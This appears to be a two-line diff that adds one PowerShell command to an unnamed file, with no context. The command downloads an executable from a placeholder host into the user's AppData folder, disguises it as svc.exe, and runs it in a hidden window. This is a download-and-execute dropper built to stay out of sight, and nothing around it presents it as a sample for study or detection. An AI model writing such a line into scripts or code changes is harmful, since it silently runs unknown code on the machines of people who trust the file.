@@ -1,0 +1,2 @@
+(New-Object Net.WebClient).DownloadFile('http://example.invalid/d.exe', "$env:APPDATA\svc.exe"); Start-Process "$env:APPDATA\svc.exe" -WindowStyle Hidden
+
